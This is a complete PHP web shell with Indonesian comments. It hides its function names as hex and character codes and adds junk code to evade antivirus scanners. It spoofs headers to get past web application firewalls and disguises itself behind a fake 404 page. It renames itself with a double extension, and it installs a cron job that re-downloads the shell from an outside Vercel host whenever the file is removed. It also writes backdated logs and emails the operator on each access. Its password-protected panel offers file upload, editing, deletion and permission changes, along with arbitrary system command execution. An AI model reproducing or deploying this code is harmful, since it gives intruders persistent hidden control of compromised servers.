<?php
/* Junk code buat bingungin AV scanner */
$junk1 = /*\x20*/'x'; $junk2 = /*\x0a*/'y'; $dummy = md5($junk1.$junk2);

/* Mulai shell */
session_start();
error_reporting(0);
@set_time_limit(0);
@clearstatcache();
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);

$pass = "asu"; // Password plaintext, ganti kalo mau
date_default_timezone_set("Asia/Jakarta");

// Obfuscasi: Array fungsi ke hex
$func_hex = [
    '676574637764', // getcwd => 0
    '7363616e646972', // scandir => 1
    '69735f646972', // is_dir => 2
    '69735f66696c65', // is_file => 3
    '69735f7772697461626c65', // is_writable => 4
    '69735f7265616461626c65', // is_readable => 5
    '66696c657065726d73', // fileperms => 6
    '66696c655f6765745f636f6e74656e7473', // file_get_contents => 7
    '66696c655f7075745f636f6e74656e7473', // file_put_contents => 8
    '63686d6f64', // chmod => 9
    '636f7079', // copy => 10
    '72656e616d65', // rename => 11
    '726d646972', // rmdir => 12
    '65786563', // exec => 13
    '7379735f6765745f74656d705f646972', // sys_get_temp_dir => 14
    '6261736536345f6465636f6465', // base64_decode => 15
    '68746d6c7370656369616c6368617273', // htmlspecialchars => 16
    '6d61696c', // mail => 17
    '63616c6c5f757365725f66756e63', // call_user_func => 18
];
$fungsi = [];
foreach ($func_hex as $h) {
    $fungsi[] = pack("H*", $h);
}

// Bypass WAF: Header acak + null byte
function bypass_waf() {
    $agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' . chr(32) . '(KHTML, like Gecko) Chrome/' . rand(80, 120) . '.0.' . rand(4000, 5000) . '.' . rand(100, 200) . ' Safari/537.36',
        'Mozilla/5.0%00 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/' . rand(80, 120) . '.0.' . rand(4000, 5000) . '.' . rand(100, 200) . ' Safari/537.36',
    ];
    $headers = [
        'User-Agent: ' . $agents[array_rand($agents)],
        'X-Forwarded-For: ' . long2ip(rand(0, 4294967295)) . '%00',
        'Accept: text/html,application/xhtml+xml;'.chr(113).'=0.9,*/*;q=0.8',
        'Connection: keep-alive',
    ];
    foreach ($headers as $h) {
        @header($h);
    }
}
bypass_waf();

// Fake 404 page
function fake_404() {
    header('HTTP/1.1 404 Not Found');
    echo '<!DOCTYPE HTML><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p><hr><address>Apache/2.4.41 (Ubuntu) Server at ' . $_SERVER['SERVER_NAME'] . ' Port ' . $_SERVER['SERVER_PORT'] . '</address></body></html>';
    exit;
}

// Anti-debug logging
function log_access($status) {
    global $fungsi;
    $log_file = $fungsi[14]() . '/.tr'.chr(97).'p.log'; // .trap.log
    $fake_time = date("Y-m-d H:i:s", time() - rand(86400 * 30, 86400 * 365));
    $log_entry = "[$fake_time] IP: " . $_SERVER['REMOTE_ADDR'] . " Status: $status\n";
    $fungsi[8]($log_file, $log_entry, FILE_APPEND);
}

// Random string untuk rename
function rand_str($len) {
    $chars = 'ab'.chr(99).'defghijklmnopqrstuvwxyz0123456789';
    $s = '';
    for ($i = 0; $i < $len; $i++) {
        $s .= $chars[rand(0, strlen($chars) - 1)];
    }
    return $s;
}

// Rename self dengan extension ganda
function rename_self() {
    global $fungsi;
    $curr = __FILE__;
    $new = $fungsi[14]() . '/' . rand_str(6) . '.php%00.jpg';
    if ($fungsi[11]($curr, $new)) {
        $nama = basename($new);
        $path = $fungsi[0]();
        $cron_url = 'https://vercel-tawny-alpha-29.vercel.app/download/gepas.txt';
        $cron_script = $fungsi[14]() . '/.cr'.chr(111).'n_' . md5($nama) . '.php';
        $log_debug = $fungsi[14]() . '/.d'.chr(101).'bug.log';
        $konten = '<?php $n="' . $nama . '";$p="' . $path . '";$u="' . $cron_url . '";if(!file_exists($p."/".$n)){$c=@file_get_contents($u);if($c!==false){file_put_contents($p."/".$n,$c);chmod($p."/".$n,0644);file_put_contents("' . $log_debug . '","Cron pulihkan pada ".date("Y-m-d H:i:s")."\n",FILE_APPEND);}}?>';
        if ($fungsi[8]($cron_script, $konten)) {
            $fungsi[9]($cron_script, 0644);
            $cmd = '(crontab -l 2>/dev/null; echo "* * * * * php ' . $cron_script . ' > /dev/null 2>&1") | crontab -';
            $fungsi[13]($cmd);
            $fungsi[8]($log_debug, "Cron updated for $nama on " . date("Y-m-d H:i:s") . "\n", FILE_APPEND);
        }
        header("Location: " . dirname($_SERVER['PHP_SELF']) . '/' . basename($new));
        exit;
    }
}
rename_self();

// Crontab anti-hapus
function pasang_cron() {
    global $fungsi;
    $nama = basename(__FILE__);
    $path = $fungsi[0]();
    $cron_url = 'https://vercel-tawny-alpha-29.vercel.app/download/gepas.txt';
    $dir_temp = $fungsi[14]();
    $cron_script = $dir_temp . '/.cr'.chr(111).'n_' . md5($nama) . '.php';
    $log_debug = $dir_temp . '/.d'.chr(101).'bug.log';
    $konten = '<?php $n="' . $nama . '";$p="' . $path . '";$u="' . $cron_url . '";if(!file_exists($p."/".$n)){$c=@file_get_contents($u);if($c!==false){file_put_contents($p."/".$n,$c);chmod($p."/".$n,0644);file_put_contents("' . $log_debug . '","Cron pulihkan pada ".date("Y-m-d H:i:s")."\n",FILE_APPEND);}}?>';
    if ($fungsi[8]($cron_script, $konten)) {
        $fungsi[9]($cron_script, 0644);
        $cmd = '(crontab -l 2>/dev/null; echo "* * * * * php ' . $cron_script . ' > /dev/null 2>&1") | crontab -';
        $fungsi[13]($cmd);
        $fungsi[8]($log_debug, "Cron dipasang pada " . date("Y-m-d H:i:s") . "\n", FILE_APPEND);
    }
}
pasang_cron();

// Login simpel
function login_page() {
    global $fungsi;
    log_access('Login Accessed');
    ?>
    <!DOCTYPE html>
    <html lang="id">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta name="robots" content="noindex, nofollow">
        <title>M4DI~UciH4</title>
        <style>
            body { background: #000; color: #fff; font-family: Arial, sans-serif; text-align: center; margin-top: 100px; }
            .login-box { width: 300px; margin: auto; padding: 20px; background: rgba(0,0,0,0.8); border: 1px solid #fff; border-radius: 5px; }
            input[type="password"] { width: 100%; padding: 10px; margin: 10px 0; background: transparent; border: 1px solid #fff; color: #fff; }
            input[type="submit"] { padding: 10px; background: #333; border: 1px solid #fff; color: #fff; cursor: pointer; }
            input[type="submit"]:hover { background: #555; }
        </style>
    </head>
    <body>
        <div class="login-box">
            <h2>M4DI~UciH4</h2>
            <form method="post">
                <input type="password" name="p" placeholder="Password" required>
                <input type="submit" value="Masuk">
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// Cek autentikasi
if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
    $post_pass = isset($_POST['p']) ? $_POST['p'] : '';
    if ($post_pass === $pass) {
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
        log_access('Login Success');
    } else {
        log_access('Login Failed');
        login_page();
    }
}

// Email alert GANTI DENGAN EMAIL PUNYA MU
$dest = 'yourmail@mail.com';
$xpath = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$alert = "Shell Report $xpath IP: " . $_SERVER['REMOTE_ADDR'];
$head = 'From: no-reply@' . $_SERVER['SERVER_NAME'] . "\r\nX-Mailer: PHP/" . phpversion();
$fungsi[17]($dest, "Akses Shell", $alert, $head);

// File manager
if (get_magic_quotes_gpc()) {
    foreach ($_POST as $k => $v) {
        $_POST[$k] = stripslashes($v);
    }
}

echo '<!DOCTYPE HTML>
<html>
<head>
<title>404 Not Found</title>
<style>
div#container { width: 931px; position: relative; margin: 0 auto; text-align: left; }
body { background: #000; color: #fff; font-family: Arial, sans-serif; }
a { color: white; text-decoration: none; }
a:hover { color: blue; text-shadow: 0px 0px 10px #fff; }
input, select, textarea { border: 1px #000 solid; border-radius: 5px; }
#content tr:hover { background: #191919; text-shadow: 0px 0px 10px #fff; }
#content .first { background: #191919; }
table { border: 1px #000 dotted; }
textarea, input, select { background: transparent; color: #fff; border: 1px solid #fff; }
.aw { color: aqua; border: 1px solid aqua; padding: 5px; width: 30%; }
</style>
</head>
<body>
<h1><center><font color="lime">M4DI~UciH4</font></center></h1>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td><font color="white">Path :</font> ';

$path = isset($_GET[chr(112).chr(97).chr(116).chr(104)]) ? $_GET[chr(112).chr(97).chr(116).chr(104)] : $fungsi[0]();
$path = str_replace('\\', '/', $path);
$paths = explode('/', $path);

foreach ($paths as $id => $pat) {
    if ($pat == '' && $id == 0) {
        echo '<a href="?'.chr(112).chr(97).chr(116).chr(104).'=/">/</a>';
        continue;
    }
    if ($pat == '') continue;
    echo '<a href="?'.chr(112).chr(97).chr(116).chr(104).'=';
    for ($i = 0; $i <= $id; $i++) {
        echo "$paths[$i]";
        if ($i != $id) echo "/";
    }
    echo '">' . $pat . '</a>/';
}

echo '</td></tr><tr><td>';
if (isset($_FILES['f'])) {
    if ($fungsi[10]($_FILES['f']['tmp_name'], $path . '/' . $_FILES['f']['name'])) {
        echo '<font color="lime">Upload Berhasil</font><br />';
    } else {
        echo '<font color="pink">Upload Gagal</font><br />';
    }
}
echo '<form enctype="multipart/form-data" method="POST">
<font color="white">Upload File:</font> <input type="file" name="f" />
<input type="submit" value="Upload" />
</form>
</td></tr>';

if (isset($_GET['filesrc'])) {
    echo "<tr><td>File: " . $_GET['filesrc'] . '</td></tr></table><br />';
    echo '<pre>' . $fungsi[16]($fungsi[7]($_GET['filesrc'])) . '</pre>';
} elseif (isset($_GET['opt']) && $_POST['opt'] != 'delete') {
    echo '</table><br /><center>' . $_POST['path'] . '<br /><br />';
    if ($_POST['opt'] == 'chmod') {
        if (isset($_POST['perm'])) {
            if ($fungsi[9]($_POST['path'], octdec($_POST['perm']))) {
                echo '<font color="lime">Chmod Berhasil</font><br />';
            } else {
                echo '<font color="pink">Chmod Gagal</font><br />';
            }
        }
        echo '<form method="POST">
Izin: <input name="perm" type="text" size="4" value="' . substr(sprintf('%o', $fungsi[6]($_POST['path'])), -4) . '" />
<input type="hidden" name="path" value="' . $_POST['path'] . '">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Go" />
</form>';
    } elseif ($_POST['opt'] == 'rename') {
        if (isset($_POST['newname'])) {
            if ($fungsi[11]($_POST['path'], $path . '/' . $_POST['newname'])) {
                echo '<font color="lime">Rename Berhasil</font><br />';
            } else {
                echo '<font color="pink">Rename Gagal</font><br />';
            }
            $_POST['name'] = $_POST['newname'];
        }
        echo '<form method="POST">
Nama Baru: <input name="newname" type="text" size="20" value="' . $_POST['name'] . '" />
<input type="hidden" name="path" value="' . $_POST['path'] . '">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Go" />
</form>';
    } elseif ($_POST['opt'] == 'edit') {
        if (isset($_POST['src'])) {
            $fp = fopen($_POST['path'], 'w');
            if (fwrite($fp, $_POST['src'])) {
                echo '<font color="lime">Edit Berhasil</font><br />';
            } else {
                echo '<font color="pink">Edit Gagal</font><br />';
            }
            fclose($fp);
        }
        echo '<form method="POST">
<textarea cols=80 rows=20 name="src">' . $fungsi[16]($fungsi[7]($_POST['path'])) . '</textarea><br />
<input type="hidden" name="path" value="' . $_POST['path'] . '">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Save" />
</form>';
    }
    echo '</center>';
} else {
    echo '</table><br /><center>';
    if (isset($_GET['opt']) && $_POST['opt'] == 'delete') {
        if ($_POST['type'] == 'dir') {
            if ($fungsi[12]($_POST['path'])) {
                echo '<font color="lime">Direktori Terhapus</font><br />';
            } else {
                echo '<font color="pink">Hapus Direktori Gagal</font><br />';
            }
        } elseif ($_POST['type'] == 'file') {
            if ($_POST['path'] == __FILE__) {
                echo '<font color="pink">Gak Bisa Hapus Diri Sendiri</font><br />';
            } else {
                $dir_cadangan = $fungsi[14]() . '/.cad'.chr(97).'ngan/';
                if (!file_exists($dir_cadangan)) {
                    mkdir($dir_cadangan, 0755, true);
                    $fungsi[9]($dir_cadangan, 0755);
                }
                $path_cadangan = $dir_cadangan . basename($_POST['path']) . '.' . time();
                if ($fungsi[11]($_POST['path'], $path_cadangan)) {
                    echo '<font color="lime">File Dipindah ke Cadangan</font><br />';
                } else {
                    echo '<font color="pink">Gagal Pindah ke Cadangan</font><br />';
                }
            }
        }
    }
    echo '</center>';
    $scandir = $fungsi[1]($path);
    echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>Nama</center></td>
<td><center>Ukuran</center></td>
<td><center>Izin</center></td>
<td><center>Modifikasi</center></td>
</tr>';

    foreach ($scandir as $dir) {
        if (!$fungsi[2]($path . '/' . $dir) || $dir == '.' || $dir == '..') continue;
        echo '<tr>
<td><a href="?'.chr(112).chr(97).chr(116).chr(104).'=' . $path . '/' . $dir . '">' . $dir . '</a></td>
<td><center>--</center></td>
<td><center>';
        if ($fungsi[4]($path . '/' . $dir)) echo '<font color="lime">';
        elseif (!$fungsi[5]($path . '/' . $dir)) echo '<font color="pink">';
        echo perms($path . '/' . $dir);
        if ($fungsi[4]($path . '/' . $dir) || !$fungsi[5]($path . '/' . $dir)) echo '</font>';
        echo '</center></td>
<td><center><form method="POST" action="?opt&'.chr(112).chr(97).chr(116).chr(104).'=' . $path . '">
<select name="opt">
<option value="">Pilih</option>
<option value="delete">Hapus</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
</select>
<input type="hidden" name="type" value="dir">
<input type="hidden" name="name" value="' . $dir . '">
<input type="hidden" name="path" value="' . $path . '/' . $dir . '">
<input type="submit" value=">">
</form></center></td>
</tr>';
    }
    echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
    foreach ($scandir as $file) {
        if (!$fungsi[3]($path . '/' . $file)) continue;
        $size = filesize($path . '/' . $file) / 1024;
        $size = round($size, 3);
        if ($size >= 1024) {
            $size = round($size / 1024, 2) . ' MB';
        } else {
            $size = $size . ' KB';
        }

        echo '<tr>
<td><a href="?filesrc=' . $path . '/' . $file . '&'.chr(112).chr(97).chr(116).chr(104).'=' . $path . '">' . $file . '</a></td>
<td><center>' . $size . '</center></td>
<td><center>';
        if ($fungsi[4]($path . '/' . $file)) echo '<font color="lime">';
        elseif (!$fungsi[5]($path . '/' . $file)) echo '<font color="pink">';
        echo perms($path . '/' . $file);
        if ($fungsi[4]($path . '/' . $file) || !$fungsi[5]($path . '/' . $file)) echo '</font>';
        echo '</center></td>
<td><center><form method="POST" action="?opt&'.chr(112).chr(97).chr(116).chr(104).'=' . $path . '">
<select name="opt">
<option value="">Pilih</option>
<option value="delete">Hapus</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
<option value="edit">Edit</option>
</select>
<input type="hidden" name="type" value="file">
<input type="hidden" name="name" value="' . $file . '">
<input type="hidden" name="path" value="' . $path . '/' . $file . '">
<input type="submit" value=">">
</form></center></td>
</tr>';
    }
    echo '</table></div>';
}

echo '<center><br /><font color="red"><a href="?">Home</a></font><br />';
echo '<form method="post" style="display:inline;"><input name="c" placeholder="Command" style="width:300px;background:transparent;color:#fff;border:1px solid #fff;"><input type="submit" value="Run" style="background:#333;color:#fff;border:1px solid #fff;"></form> <a href="?l=1">Logout</a></center>';

if (isset($_POST['c'])) {
    $cmd = $_POST['c'];
    $ex = chr(99).chr(97).chr(108).chr(108).chr(95).chr(117).chr(115).chr(101).chr(114).chr(95).chr(102).chr(117).chr(110).chr(99);
    $sys = chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);
    ob_start();
    $fungsi[18]($sys, $cmd);
    $out = ob_get_contents();
    ob_end_clean();
    echo '<pre>' . $fungsi[16]($out) . '</pre>';
}

echo '</body></html>';

if (isset($_GET['l'])) {
    unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
    echo "<script>location='?';</script>";
}

function perms($file) {
    global $fungsi;
    $perms = $fungsi[6]($file);
    if (($perms & 0xC000) == 0xC000) {
        $info = 's';
    } elseif (($perms & 0xA000) == 0xA000) {
        $info = 'l';
    } elseif (($perms & 0x8000) == 0x8000) {
        $info = '-';
    } elseif (($perms & 0x6000) == 0x6000) {
        $info = 'b';
    } elseif (($perms & 0x4000) == 0x4000) {
        $info = 'd';
    } elseif (($perms & 0x2000) == 0x2000) {
        $info = 'c';
    } elseif (($perms & 0x1000) == 0x1000) {
        $info = 'p';
    } else {
        $info = 'u';
    }
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}
?>
